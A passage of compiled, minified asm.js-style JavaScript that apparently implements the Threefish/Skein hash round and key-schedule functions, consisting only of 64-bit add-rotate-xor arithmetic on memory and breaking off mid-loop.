            ra = wb(qa | 0, ra | 0, ka | 0, ya | 0) | 0;
            qa = y;
            ga = zb(ka | 0, ya | 0, 17) | 0;
            oa = y;
            ya = yb(ka | 0, ya | 0, 47) | 0;
            ya = (ga | ya) ^ ra;
            oa = (oa | y) ^ qa;
            aa = wb(_ | 0, aa | 0, ca | 0, ta | 0) | 0;
            _ = y;
            ga = zb(ca | 0, ta | 0, 25) | 0;
            ka = y;
            ta = yb(ca | 0, ta | 0, 39) | 0;
            ta = (ga | ta) ^ aa;
            ka = (ka | y) ^ _;
            ua = wb(va | 0, ua | 0, ya | 0, oa | 0) | 0;
            va = y;
            ga = zb(ya | 0, oa | 0, 29) | 0;
            ca = y;
            oa = yb(ya | 0, oa | 0, 35) | 0;
            oa = (ga | oa) ^ ua;
            ca = (ca | y) ^ va;
            qa = wb(sa | 0, Aa | 0, ra | 0, qa | 0) | 0;
            ra = y;
            ga = zb(sa | 0, Aa | 0, 39) | 0;
            ya = y;
            Aa = yb(sa | 0, Aa | 0, 25) | 0;
            Aa = (ga | Aa) ^ qa;
            ya = (ya | y) ^ ra;
            ia = wb(ma | 0, za | 0, xa | 0, ia | 0) | 0;
            xa = y;
            ga = zb(ma | 0, za | 0, 43) | 0;
            sa = y;
            za = yb(ma | 0, za | 0, 21) | 0;
            za = (ga | za) ^ ia;
            sa = (sa | y) ^ xa;
            va = wb(ta | 0, ka | 0, ua | 0, va | 0) | 0;
            ua = y;
            ga = zb(ta | 0, ka | 0, 8) | 0;
            ma = y;
            ka = yb(ta | 0, ka | 0, 56) | 0;
            ma = (ma | y) ^ ua;
            ra = wb(za | 0, sa | 0, qa | 0, ra | 0) | 0;
            qa = y;
            ta = zb(za | 0, sa | 0, 35) | 0;
            Q = y;
            sa = yb(za | 0, sa | 0, 29) | 0;
            Q = (Q | y) ^ qa;
            xa = wb(Aa | 0, ya | 0, ia | 0, xa | 0) | 0;
            ia = y;
            za = zb(Aa | 0, ya | 0, 56) | 0;
            wa = y;
            ya = yb(Aa | 0, ya | 0, 8) | 0;
            wa = (wa | y) ^ ia;
            _ = wb(aa | 0, _ | 0, oa | 0, ca | 0) | 0;
            aa = y;
            Aa = zb(oa | 0, ca | 0, 22) | 0;
            ea = y;
            ca = yb(oa | 0, ca | 0, 42) | 0;
            ea = (ea | y) ^ aa;
            qa = wb(ra | 0, qa | 0, r | 0, s | 0) | 0;
            oa = y;
            ma = wb((ga | ka) ^ va | 0, ma | 0, t | 0, u | 0) | 0;
            ka = y;
            ia = wb(xa | 0, ia | 0, v | 0, w | 0) | 0;
            ga = y;
            ea = wb((Aa | ca) ^ _ | 0, ea | 0, x | 0, z | 0) | 0;
            ca = y;
            aa = wb(_ | 0, aa | 0, a | 0, g | 0) | 0;
            _ = y;
            Y = wb((za | ya) ^ xa | 0, wa | 0, W | 0, Y | 0) | 0;
            W = y;
            U = wb(va | 0, ua | 0, S | 0, U | 0) | 0;
            S = y;
            ua = wb(l | 0, m | 0, 18, 0) | 0;
            Q = wb(ua | 0, y | 0, (ta | sa) ^ ra | 0, Q | 0) | 0;
            r = qa ^ pa;
            s = oa ^ na;
            na = F;
            c[na >> 2] = r;
            c[na + 4 >> 2] = s;
            t = ma ^ la;
            u = ka ^ ja;
            ja = G;
            c[ja >> 2] = t;
            c[ja + 4 >> 2] = u;
            v = ia ^ ha;
            w = ga ^ fa;
            fa = H;
            c[fa >> 2] = v;
            c[fa + 4 >> 2] = w;
            x = ea ^ da;
            z = ca ^ ba;
            ba = I;
            c[ba >> 2] = x;
            c[ba + 4 >> 2] = z;
            a = aa ^ $;
            g = _ ^ Z;
            Z = J;
            c[Z >> 2] = a;
            c[Z + 4 >> 2] = g;
            h = Y ^ X;
            i = W ^ V;
            V = K;
            c[V >> 2] = h;
            c[V + 4 >> 2] = i;
            j = U ^ T;
            k = S ^ R;
            R = L;
            c[R >> 2] = j;
            c[R + 4 >> 2] = k;
            l = Q ^ P;
            m = y ^ O;
            O = A;
            c[O >> 2] = l;
            c[O + 4 >> 2] = m;
            o = o & -1073741825;
            e = e + -1 | 0;
            if (!e) break;
            else b = b + 64 | 0
        }
        Pa = wb(N | 0, D | 0, B | 0, C | 0) | 0;
        Qa = M;
        c[Qa >> 2] = Pa;
        c[Qa + 4 >> 2] = y;
        Qa = E;
        c[Qa >> 2] = n;
        c[Qa + 4 >> 2] = o;
        return
    }

    function Sa(a, b, e, f) {
        a = a | 0;
        b = b | 0;
        e = e | 0;
        f = f | 0;
        var g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0,
            L = 0,
            M = 0,
            N = 0,
            O = 0,
            P = 0,
            Q = 0,
            R = 0,
            S = 0,
            T = 0,
            U = 0,
            V = 0,
            W = 0,
            X = 0,
            Y = 0,
            Z = 0,
            _ = 0,
            $ = 0,
            aa = 0,
            ba = 0,
            ca = 0,
            da = 0,
            ea = 0,
            fa = 0,
            ga = 0,
            ha = 0,
            ia = 0,
            ja = 0,
            ka = 0,
            la = 0,
            ma = 0,
            na = 0,
            oa = 0,
            pa = 0,
            qa = 0,
            ra = 0,
            sa = 0,
            ta = 0,
            ua = 0,
            va = 0,
            wa = 0,
            xa = 0,
            ya = 0,
            za = 0,
            Aa = 0,
            Ba = 0,
            Ca = 0,
            Da = 0,
            Ea = 0,
            Fa = 0,
            Ga = 0,
            Ha = 0,
            Ia = 0,
            Ja = 0,
            Ka = 0,
            La = 0,
            Ma = 0,
            Na = 0,
            Oa = 0,
            Pa = 0,
            Qa = 0,
            Ra = 0,
            Sa = 0,
            Ta = 0,
            Ua = 0,
            Va = 0,
            Wa = 0,
            Xa = 0,
            Ya = 0,
            Za = 0,
            _a = 0,
            $a = 0,
            ab = 0,
            bb = 0,
            cb = 0,
            db = 0,
            eb = 0,
            fb = 0,
            gb = 0,
            hb = 0,
            ib = 0,
            jb = 0,
            kb = 0,
            lb = 0,
            mb = 0,
            nb = 0,
            ob = 0,
            pb = 0,
            qb = 0,
            rb = 0,
            sb = 0,
            tb = 0,
            ub = 0,
            vb = 0,
            xb = 0,
            Ab = 0,
            Bb = 0,
            Cb = 0,
            Db = 0,
            Eb = 0,
            Fb = 0,
            Gb = 0,
            Hb = 0,
            Ib = 0,
            Jb = 0,
            Kb = 0,
            Lb = 0,
            Mb = 0,
            Nb = 0,
            Ob = 0,
            Pb = 0,
            Qb = 0,
            Rb = 0,
            Sb = 0,
            Tb = 0,
            Ub = 0,
            Vb = 0,
            Wb = 0,
            Xb = 0,
            Yb = 0,
            Zb = 0,
            _b = 0,
            $b = 0,
            ac = 0,
            bc = 0,
            cc = 0,
            dc = 0,
            ec = 0,
            fc = 0,
            gc = 0,
            hc = 0,
            ic = 0,
            jc = 0,
            kc = 0,
            lc = 0,
            mc = 0,
            nc = 0,
            oc = 0,
            pc = 0;
        sb = l;
        l = l + 320 | 0;
        _a = sb;
        jb = a + 8 | 0;
        m = jb;
        k = c[m >> 2] | 0;
        m = c[m + 4 >> 2] | 0;
        Ma = _a;
        c[Ma >> 2] = k;
        c[Ma + 4 >> 2] = m;
        Ma = a + 16 | 0;
        Ha = Ma;
        g = c[Ha >> 2] | 0;
        Ha = c[Ha + 4 >> 2] | 0;
        Na = _a + 8 | 0;
        Oa = Na;
        c[Oa >> 2] = g;
        c[Oa + 4 >> 2] = Ha;
        Oa = a + 24 | 0;
        Pa = _a + 24 | 0;
        Qa = a + 32 | 0;
        Ra = _a + 32 | 0;
        Sa = a + 40 | 0;
        Ta = _a + 40 | 0;
        Ua = a + 48 | 0;
        Va = _a + 48 | 0;
        Wa = a + 56 | 0;
        Xa = _a + 56 | 0;
        Ya = a + 64 | 0;
        Za = _a + 64 | 0;
        $a = a + 72 | 0;
        ab = _a + 72 | 0;
        bb = a + 80 | 0;
        cb = _a + 80 | 0;
        db = a + 88 | 0;
        eb = _a + 88 | 0;
        fb = a + 96 | 0;
        gb = _a + 96 | 0;
        hb = a + 104 | 0;
        ib = _a + 104 | 0;
        kb = a + 112 | 0;
        lb = _a + 112 | 0;
        mb = a + 120 | 0;
        nb = _a + 120 | 0;
        ob = a + 128 | 0;
        pb = _a + 128 | 0;
        qb = a + 136 | 0;
        rb = _a + 136 | 0;
        Ia = a + 144 | 0;
        Ja = _a + 144 | 0;
        Ka = _a + 152 | 0;
        La = _a + 16 | 0;
        B = Oa;
        _ = Qa;
        W = Sa;
        S = Ua;
        O = Wa;
        K = Ya;
        G = $a;
        C = bb;
        z = db;
        w = fb;
        u = hb;
        s = kb;
        q = mb;
        o = ob;
        j = qb;
        h = Ia;
        da = c[B >> 2] | 0;
        B = c[B + 4 >> 2] | 0;
        aa = c[_ >> 2] | 0;
        _ = c[_ + 4 >> 2] | 0;
        Y = c[W >> 2] | 0;
        W = c[W + 4 >> 2] | 0;
        U = c[S >> 2] | 0;
        S = c[S + 4 >> 2] | 0;
        Q = c[O >> 2] | 0;
        O = c[O + 4 >> 2] | 0;
        M = c[K >> 2] | 0;
        K = c[K + 4 >> 2] | 0;
        I = c[G >> 2] | 0;
        G = c[G + 4 >> 2] | 0;
        E = c[C >> 2] | 0;
        C = c[C + 4 >> 2] | 0;
        A = c[z >> 2] | 0;
        z = c[z + 4 >> 2] | 0;
        x = c[w >> 2] | 0;
        w = c[w + 4 >> 2] | 0;
        v = c[u >> 2] | 0;
        u = c[u + 4 >> 2] | 0;
        t = c[s >> 2] | 0;
        s = c[s + 4 >> 2] | 0;
        r = c[q >> 2] | 0;
        q = c[q + 4 >> 2] | 0;
        p = c[o >> 2] | 0;
        o = c[o + 4 >> 2] | 0;
        n = c[j >> 2] | 0;
        j = c[j + 4 >> 2] | 0;
        i = c[h >> 2] | 0;
        h = c[h + 4 >> 2] | 0;
        a = Ha;
        while (1) {
            T = wb(k | 0, m | 0, f | 0, 0) | 0;
            R = y;
            ca = _a;
            c[ca >> 2] = T;
            c[ca + 4 >> 2] = R;
            ca = Pa;
            c[ca >> 2] = da;
            c[ca + 4 >> 2] = B;
            ca = Ra;
            c[ca >> 2] = aa;
            c[ca + 4 >> 2] = _;
            ca = Ta;
            c[ca >> 2] = Y;
            c[ca + 4 >> 2] = W;
            ca = Va;
            c[ca >> 2] = U;
            c[ca + 4 >> 2] = S;
            ca = Xa;
            c[ca >> 2] = Q;
            c[ca + 4 >> 2] = O;
            ca = Za;
            c[ca >> 2] = M;
            c[ca + 4 >> 2] = K;
            ca = ab;
            c[ca >> 2] = I;
            c[ca + 4 >> 2] = G;
            ca = cb;
            c[ca >> 2] = E;
            c[ca + 4 >> 2] = C;
            ca = eb;
            c[ca >> 2] = A;
            c[ca + 4 >> 2] = z;
            ca = gb;
            c[ca >> 2] = x;
            c[ca + 4 >> 2] = w;
            ca = ib;
            c[ca >> 2] = v;
            c[ca + 4 >> 2] = u;
            ca = lb;
            c[ca >> 2] = t;
            c[ca + 4 >> 2] = s;
            ca = nb;
            c[ca >> 2] = r;
            c[ca + 4 >> 2] = q;
            ca = pb;
            c[ca >> 2] = p;
            c[ca + 4 >> 2] = o;
            ca = rb;
            c[ca >> 2] = n;
            c[ca + 4 >> 2] = j;
            ca = Ja;
            c[ca >> 2] = i;
            c[ca + 4 >> 2] = h;
            ca = Ka;
            c[ca >> 2] = i ^ -1443096030 ^ da ^ aa ^ Y ^ U ^ Q ^ M ^ I ^ E ^ A ^ x ^ v ^ t ^ r ^ p ^ n;
            c[ca + 4 >> 2] = h ^ 466688986 ^ B ^ _ ^ W ^ S ^ O ^ K ^ G ^ C ^ z ^ w ^ u ^ s ^ q ^ o ^ j;
            ca = La;
            c[ca >> 2] = g ^ T;
            c[ca + 4 >> 2] = a ^ R;
            ca = b;
            ba = ca;
            ba = d[ba >> 0] | d[ba + 1 >> 0] << 8 | d[ba + 2 >> 0] << 16 | d[ba + 3 >> 0] << 24;
            ca = ca + 4 | 0;
            ca = d[ca >> 0] | d[ca + 1 >> 0] << 8 | d[ca + 2 >> 0] << 16 | d[ca + 3 >> 0] << 24;
            fa = b + 8 | 0;
            ea = fa;
            ea = d[ea >> 0] | d[ea + 1 >> 0] << 8 | d[ea + 2 >> 0] << 16 | d[ea + 3 >> 0] << 24;
            fa = fa + 4 | 0;
            fa = d[fa >> 0] | d[fa + 1 >> 0] << 8 | d[fa + 2 >> 0] << 16 | d[fa + 3 >> 0] << 24;
            ha = b + 16 | 0;
            ga = ha;
            ga = d[ga >> 0] | d[ga + 1 >> 0] << 8 | d[ga + 2 >> 0] << 16 | d[ga + 3 >> 0] << 24;
            ha = ha + 4 | 0;
            ha = d[ha >> 0] | d[ha + 1 >> 0] << 8 | d[ha + 2 >> 0] << 16 | d[ha + 3 >> 0] << 24;
            ja = b + 24 | 0;
            ia = ja;
            ia = d[ia >> 0] | d[ia + 1 >> 0] << 8 | d[ia + 2 >> 0] << 16 | d[ia + 3 >> 0] << 24;
            ja = ja + 4 | 0;
            ja = d[ja >> 0] | d[ja + 1 >> 0] << 8 | d[ja + 2 >> 0] << 16 | d[ja + 3 >> 0] << 24;
            la = b + 32 | 0;
            ka = la;
            ka = d[ka >> 0] | d[ka + 1 >> 0] << 8 | d[ka + 2 >> 0] << 16 | d[ka + 3 >> 0] << 24;
            la = la + 4 | 0;
            la = d[la >> 0] | d[la + 1 >> 0] << 8 | d[la + 2 >> 0] << 16 | d[la + 3 >> 0] << 24;
            na = b + 40 | 0;
            ma = na;
            ma = d[ma >> 0] | d[ma + 1 >> 0] << 8 | d[ma + 2 >> 0] << 16 | d[ma + 3 >> 0] << 24;
            na = na + 4 | 0;
            na = d[na >> 0] | d[na + 1 >> 0] << 8 | d[na + 2 >> 0] << 16 | d[na + 3 >> 0] << 24;
            pa = b + 48 | 0;
            oa = pa;
            oa = d[oa >> 0] | d[oa + 1 >> 0] << 8 | d[oa + 2 >> 0] << 16 | d[oa + 3 >> 0] << 24;
            pa = pa + 4 | 0;
            pa = d[pa >> 0] | d[pa + 1 >> 0] << 8 | d[pa + 2 >> 0] << 16 | d[pa + 3 >> 0] << 24;
            ra = b + 56 | 0;
            qa = ra;
            qa = d[qa >> 0] | d[qa + 1 >> 0] << 8 | d[qa + 2 >> 0] << 16 | d[qa + 3 >> 0] << 24;
            ra = ra + 4 | 0;
            ra = d[ra >> 0] | d[ra + 1 >> 0] << 8 | d[ra + 2 >> 0] << 16 | d[ra + 3 >> 0] << 24;
            ta = b + 64 | 0;
            sa = ta;
            sa = d[sa >> 0] | d[sa + 1 >> 0] << 8 | d[sa + 2 >> 0] << 16 | d[sa + 3 >> 0] << 24;
            ta = ta + 4 | 0;
            ta = d[ta >> 0] | d[ta + 1 >> 0] << 8 | d[ta + 2 >> 0] << 16 | d[ta + 3 >> 0] << 24;
            va = b + 72 | 0;
            ua = va;
            ua = d[ua >> 0] | d[ua + 1 >> 0] << 8 | d[ua + 2 >> 0] << 16 | d[ua + 3 >> 0] << 24;
            va = va + 4 | 0;
            va = d[va >> 0] | d[va + 1 >> 0] << 8 | d[va + 2 >> 0] << 16 | d[va + 3 >> 0] << 24;
            xa = b + 80 | 0;
            wa = xa;
            wa = d[wa >> 0] | d[wa + 1 >> 0] << 8 | d[wa + 2 >> 0] << 16 | d[wa + 3 >> 0] << 24;
            xa = xa + 4 | 0;
            xa = d[xa >> 0] | d[xa + 1 >> 0] << 8 | d[xa + 2 >> 0] << 16 | d[xa + 3 >> 0] << 24;
            za = b + 88 | 0;
            ya = za;
            ya = d[ya >> 0] | d[ya + 1 >> 0] << 8 | d[ya + 2 >> 0] << 16 | d[ya + 3 >> 0] << 24;
            za = za + 4 | 0;
            za = d[za >> 0] | d[za + 1 >> 0] << 8 | d[za + 2 >> 0] << 16 | d[za + 3 >> 0] << 24;
            Ba = b + 96 | 0;
            Aa = Ba;
            Aa = d[Aa >> 0] | d[Aa + 1 >> 0] << 8 | d[Aa + 2 >> 0] << 16 | d[Aa + 3 >> 0] << 24;
            Ba = Ba + 4 | 0;
            Ba = d[Ba >> 0] | d[Ba + 1 >> 0] << 8 | d[Ba + 2 >> 0] << 16 | d[Ba + 3 >> 0] << 24;
            Da = b + 104 | 0;
            Ca = Da;
            Ca = d[Ca >> 0] | d[Ca + 1 >> 0] << 8 | d[Ca + 2 >> 0] << 16 | d[Ca + 3 >> 0] << 24;
            Da = Da + 4 | 0;
            Da = d[Da >> 0] | d[Da + 1 >> 0] << 8 | d[Da + 2 >> 0] << 16 | d[Da + 3 >> 0] << 24;
            Fa = b + 112 | 0;
            Ea = Fa;
            Ea = d[Ea >> 0] | d[Ea + 1 >> 0] << 8 | d[Ea + 2 >> 0] << 16 | d[Ea + 3 >> 0] << 24;
            Fa = Fa + 4 | 0;
            Fa = d[Fa >> 0] | d[Fa + 1 >> 0] << 8 | d[Fa + 2 >> 0] << 16 | d[Fa + 3 >> 0] << 24;
            Ha = b + 120 | 0;
            Ga = Ha;
            Ga = d[Ga >> 0] | d[Ga + 1 >> 0] << 8 | d[Ga + 2 >> 0] << 16 | d[Ga + 3 >> 0] << 24;
            Ha = Ha + 4 | 0;
            Ha = d[Ha >> 0] | d[Ha + 1 >> 0] << 8 | d[Ha + 2 >> 0] << 16 | d[Ha + 3 >> 0] << 24;
            g = wb(da | 0, B | 0, ba | 0, ca | 0) | 0;
            Ab = y;
            xb = wb(aa | 0, _ | 0, ea | 0, fa | 0) | 0;
            vb = y;
            k = wb(Y | 0, W | 0, ga | 0, ha | 0) | 0;
            m = y;
            ub = wb(U | 0, S | 0, ia | 0, ja | 0) | 0;
            tb = y;
            Q = wb(Q | 0, O | 0, ka | 0, la | 0) | 0;
            S = y;
            U = wb(M | 0, K | 0, ma | 0, na | 0) | 0;
            W = y;
            Y = wb(I | 0, G | 0, oa | 0, pa | 0) | 0;
            _ = y;
            aa = wb(E | 0, C | 0, qa | 0, ra | 0) | 0;
            da = y;
            $ = wb(A | 0, z | 0, sa | 0, ta | 0) | 0;
            z = y;
            B = wb(x | 0, w | 0, ua | 0, va | 0) | 0;
            D = y;
            F = wb(v | 0, u | 0, wa | 0, xa | 0) | 0;
            H = y;
            J = wb(t | 0, s | 0, ya | 0, za | 0) | 0;
            L = y;
            N = wb(r | 0, q | 0, Aa | 0, Ba | 0) | 0;
            P = y;
            X = wb(p | 0, o | 0, Ca | 0, Da | 0) | 0;
            R = wb(X | 0, y | 0, T | 0, R | 0) | 0;
            T = y;
            X = wb(n | 0, j | 0, Ea | 0, Fa | 0) | 0;
            V = Na;
            V = wb(X | 0, y | 0, c[V >> 2] | 0, c[V + 4 >> 2] | 0) | 0;
            X = y;
            Z = wb(i | 0, h | 0, Ga | 0, Ha | 0) | 0;
            a = 1;
            h = Ab;
            i = xb;
            j = vb;
            n = ub;
            o = tb;
            p = Q;
            q = S;
            r = U;
            s = W;
            t = Y;
            u = _;
            v = aa;
            w = da;
            x = $;
            $ = y;
            do {
                _ = wb(g | 0, h | 0, i | 0, j | 0) | 0;
                Y = y;
                Gb = zb(i | 0, j | 0, 24) | 0;
                Lb = y;
                Vb = yb(i | 0, j | 0, 40) | 0;
                Vb = (Gb | Vb) ^ _;
                Lb = (Lb | y) ^ Y;
                Gb = wb(k | 0, m | 0, n | 0, o | 0) | 0;
                Fb = y;
                Ob = zb(n | 0, o | 0, 13) | 0;
                Ub = y;
                dc = yb(n | 0, o | 0, 51) | 0;
                dc = (Ob | dc) ^ Gb;
                Ub = (Ub | y) ^ Fb;
                Ob = wb(p | 0, q | 0, r | 0, s | 0) | 0;
                Nb = y;
                G = zb(r | 0, s | 0, 8) | 0;
                gc = y;
                Zb = yb(r | 0, s | 0, 56) | 0;
                Zb = (G | Zb) ^ Ob;
                gc = (gc | y) ^ Nb;
                G = wb(t | 0, u | 0, v | 0, w | 0) | 0;
                O = y;
                Rb = zb(v | 0, w | 0, 47) | 0;
                ac = y;
                Wb = yb(v | 0, w | 0, 17) | 0;
                Wb = (Rb | Wb) ^ G;
                ac = (ac | y) ^ O;
                Rb = wb(x | 0, z | 0, B | 0, D | 0) | 0;
                Qb = y;
                Jb = zb(B | 0, D | 0, 8) | 0;
                S = y;
                Kb = yb(B | 0, D | 0, 56) | 0;
                Kb = (Jb | Kb) ^ Rb;
                S = (S | y) ^ Qb;
                Jb = wb(F | 0, H | 0, J | 0, L | 0) | 0;
                Ib = y;
                Bb = zb(J | 0, L | 0, 17) | 0;
                Pb = y;
                Cb = yb(J | 0, L | 0, 47) | 0;
                Cb = (Bb | Cb) ^ Jb;
                Pb = (Pb | y) ^ Ib;
                Bb = wb(N | 0, P | 0, R | 0, T | 0) | 0;
                K = y;
                W = zb(R | 0, T | 0, 22) | 0;
                Hb = y;
                I = yb(R | 0, T | 0, 42) | 0;
                I = Bb ^ (W | I);
                Hb = K ^ (Hb | y);
                W = wb(Z | 0, $ | 0, V | 0, X | 0) | 0;
                E = y;
                ub = zb(Z | 0, $ | 0, 37) | 0;
                Db = y;
                tb = yb(Z | 0, $ | 0, 27) | 0;
                tb = (ub | tb) ^ W;
                Db = (Db | y) ^ E;
                Y = wb(_ | 0, Y | 0, Kb | 0, S | 0) | 0;
                _ = y;
                ub = zb(Kb | 0, S | 0, 38) | 0;
                xb = y;
                S = yb(Kb | 0, S | 0, 26) | 0;
                S = Y ^ (ub | S);
                xb = _ ^ (xb | y);
                Fb = wb(Gb | 0, Fb | 0, I | 0, Hb | 0) | 0;
                Gb = y;
                ub = zb(I | 0, Hb | 0, 19) | 0;
                Kb = y;
                Hb = yb(I | 0, Hb | 0, 45) | 0;
                Hb = Fb ^ (ub | Hb);
                Kb = Gb ^ (Kb | y);
                O = wb(G | 0, O | 0, Cb | 0, Pb | 0) | 0;
                G = y;
                ub = zb(Cb | 0, Pb | 0, 10) | 0;
                I = y;
                Pb = yb(Cb | 0, Pb | 0, 54) | 0;
                Pb = O ^ (ub | Pb);
                I = G ^ (I | y);
                Nb = wb(Ob | 0, Nb | 0, tb | 0, Db | 0) | 0;
                Ob = y;
                ub = zb(tb | 0, Db | 0, 55) | 0;
                Cb = y;
                Db = yb(tb | 0, Db | 0, 9) | 0;
                Db = Nb ^ (ub | Db);
                Cb = Ob ^ (Cb | y);
                Ib = wb(Wb | 0, ac | 0, Jb | 0, Ib | 0) | 0;
                Jb = y;
                ub = zb(Wb | 0, ac | 0, 49) | 0;
                tb = y;
                ac = yb(Wb | 0, ac | 0, 15) | 0;
                ac = (ub | ac) ^ Ib;
                tb = (tb | y) ^ Jb;
                K = wb(dc | 0, Ub | 0, Bb | 0, K | 0) | 0;
                Bb = y;
                ub = zb(dc | 0, Ub | 0, 18) | 0;
                Wb = y;
                Ub = yb(dc | 0, Ub | 0, 46) | 0;
                Ub = (ub | Ub) ^ K;
                Wb = (Wb | y) ^ Bb;
                E = wb(Zb | 0, gc | 0, W | 0, E | 0) | 0;
                W = y;
                ub = zb(Zb | 0, gc | 0, 23) | 0;
                dc = y;
                gc = yb(Zb | 0, gc | 0, 41) | 0;
                gc = (ub | gc) ^ E;
                dc = (dc | y) ^ W;
                Qb = wb(Vb | 0, Lb | 0, Rb | 0, Qb | 0) | 0;
                Rb = y;
                ub = zb(Vb | 0, Lb | 0, 52) | 0;
                Zb = y;
                Lb = yb(Vb | 0, Lb | 0, 12) | 0;
                Lb = (ub | Lb) ^ Qb;
                Zb = (Zb | y) ^ Rb;
                _ = wb(Y | 0, _ | 0, ac | 0, tb | 0) | 0;
                Y = y;
                ub = zb(ac | 0, tb | 0, 33) | 0;
                Vb = y;
                tb = yb(ac | 0, tb | 0, 31) | 0;
                tb = _ ^ (ub | tb);
                Vb = Y ^ (Vb | y);
                Gb = wb(gc | 0, dc | 0, Fb | 0, Gb | 0) | 0;
                Fb = y;
                ub = zb(gc | 0, dc | 0, 4) | 0;
                ac = y;
                dc = yb(gc | 0, dc | 0, 60) | 0;
                dc = (ub | dc) ^ Gb;
                ac = (ac | y) ^ Fb;
                Ob = wb(Ub | 0, Wb | 0, Nb | 0, Ob | 0) | 0;
                Nb = y;
                ub = zb(Ub | 0, Wb | 0, 51) | 0;
                gc = y;
                Wb = yb(Ub | 0, Wb | 0, 13) | 0;
                Wb = (ub | Wb) ^ Ob;
                gc = (gc | y) ^ Nb;
                G = wb(Lb | 0, Zb | 0, O | 0, G | 0) | 0;
                O = y;
                ub = zb(Lb | 0, Zb | 0, 13) | 0;
                Ub = y;
                Zb = yb(Lb | 0, Zb | 0, 51) | 0;
                Zb = (ub | Zb) ^ G;
                Ub = (Ub | y) ^ O;
                Bb = wb(K | 0, Bb | 0, Db | 0, Cb | 0) | 0;
                K = y;
                ub = zb(Db | 0, Cb | 0, 34) | 0;
                Lb = y;
                Cb = yb(Db | 0, Cb | 0, 30) | 0;
                Cb = Bb ^ (ub | Cb);
                Lb = K ^ (Lb | y);
                W = wb(Hb | 0, Kb | 0, E | 0, W | 0) | 0;
                E = y;
                ub = zb(Hb | 0, Kb | 0, 41) | 0;
                Db = y;
                Kb = yb(Hb | 0, Kb | 0, 23) | 0;
                Kb = (ub | Kb) ^ W;
                Db = (Db | y) ^ E;
                Rb = wb(Qb | 0, Rb | 0, Pb | 0, I | 0) | 0;
                Qb = y;
                ub = zb(Pb | 0, I | 0, 59) | 0;
                Hb = y;
                I = yb(Pb | 0, I | 0, 5) | 0;
                I = Rb ^ (ub | I);
                Hb = Qb ^ (Hb | y);
                Jb = wb(S | 0, xb | 0, Ib | 0, Jb | 0) | 0;
                Ib = y;
                ub = zb(S | 0, xb | 0, 17) | 0;
                Pb = y;
                xb = yb(S | 0, xb | 0, 47) | 0;
                xb = (ub | xb) ^ Jb;
                Pb = (Pb | y) ^ Ib;
                Y = wb(_ | 0, Y | 0, Cb | 0, Lb | 0) | 0;
                _ = y;
                ub = zb(Cb | 0, Lb | 0, 5) | 0;
                S = y;
                Lb = yb(Cb | 0, Lb | 0, 59) | 0;
                S = (S | y) ^ _;
                Fb = wb(I | 0, Hb | 0, Gb | 0, Fb | 0) | 0;
                Gb = y;
                Cb = zb(I | 0, Hb | 0, 20) | 0;
                Eb = y;
                Hb = yb(I | 0, Hb | 0, 44) | 0;
                Eb = (Eb | y) ^ Gb;
                O = wb(G | 0, O | 0, Kb | 0, Db | 0) | 0;
                G = y;
                I = zb(Kb | 0, Db | 0, 48) | 0;
                A = y;
                Db = yb(Kb | 0, Db | 0, 16) | 0;
                A = G ^ (A | y);
                Nb = wb(xb | 0, Pb | 0, Ob | 0, Nb | 0) | 0;
                Ob = y;
                Kb = zb(xb | 0, Pb | 0, 41) | 0;
                Mb = y;
                Pb = yb(xb | 0, Pb | 0, 23) | 0;
                Mb = (Mb | y) ^ Ob;
                E = wb(Zb | 0, Ub | 0, W | 0, E | 0) | 0;
                W = y;
                xb = zb(Zb | 0, Ub | 0, 47) | 0;
                lc = y;
                Ub = yb(Zb | 0, Ub | 0, 17) | 0;
                lc = (lc | y) ^ W;
                Qb = wb(Rb | 0, Qb | 0, dc | 0, ac | 0) | 0;
                Rb = y;
                Zb = zb(dc | 0, ac | 0, 28) | 0;
                $b = y;
                ac = yb(dc | 0, ac | 0, 36) | 0;
                $b = ($b | y) ^ Rb;
                Ib = wb(Wb | 0, gc | 0, Jb | 0, Ib | 0) | 0;
                Jb = y;
                dc = zb(Wb | 0, gc | 0, 16) | 0;
                fc = y;
                gc = yb(Wb | 0, gc | 0, 48) | 0;
                fc = (fc | y) ^ Jb;
                K = wb(tb | 0, Vb | 0, Bb | 0, K | 0) | 0;
                Bb = y;
                Wb = zb(tb | 0, Vb | 0, 25) | 0;
                aa = y;
                Vb = yb(tb | 0, Vb | 0, 39) | 0;
                aa = (aa | y) ^ Bb;
                tb = Pa + (a << 3) | 0;
                oc = tb;
                _ = wb(c[oc >> 2] | 0, c[oc + 4 >> 2] | 0, Y | 0, _ | 0) | 0;
                oc = y;
                U = a + 1 | 0;
                nc = Pa + (U << 3) | 0;
                jc = nc;
                lc = wb(c[jc >> 2] | 0, c[jc + 4 >> 2] | 0, (xb | Ub) ^ E | 0, lc | 0) | 0;
                Ub = y;
                xb = a;
                a = a + 2 | 0;
                jc = Pa + (a << 3) | 0;
                ic = jc;
                Gb = wb(c[ic >> 2] | 0, c[ic + 4 >> 2] | 0, Fb | 0, Gb | 0) | 0;
                ic = y;
                Ab = xb + 3 | 0;
                hc = Pa + (Ab << 3) | 0;
                bc = hc;
                fc = wb(c[bc >> 2] | 0, c[bc + 4 >> 2] | 0, (dc | gc) ^ Ib | 0, fc | 0) | 0;
                gc = y;
                dc = Pa + (xb + 4 << 3) | 0;
                bc = dc;
                Ob = wb(c[bc >> 2] | 0, c[bc + 4 >> 2] | 0, Nb | 0, Ob | 0) | 0;
                bc = y;
                cc = Pa + (xb + 5 << 3) | 0;
                Xb = cc;
                $b = wb(c[Xb >> 2] | 0, c[Xb + 4 >> 2] | 0, (Zb | ac) ^ Qb | 0, $b | 0) | 0;
                ac = y;
                Zb = Pa + (xb + 6 << 3) | 0;
                Xb = Zb;
                G = wb(c[Xb >> 2] | 0, c[Xb + 4 >> 2] | 0, O | 0, G | 0) | 0;
                Xb = y;
                Yb = Pa + (xb + 7 << 3) | 0;
                Sb = Yb;
                aa = wb(c[Sb >> 2] | 0, c[Sb + 4 >> 2] | 0, (Wb | Vb) ^ K | 0, aa | 0) | 0;
                Vb = y;
                Wb = Pa + (xb + 8 << 3) | 0;
                Sb = Wb;
                Rb = wb(c[Sb >> 2] | 0, c[Sb + 4 >> 2] | 0, Qb | 0, Rb | 0) | 0;
                Qb = y;
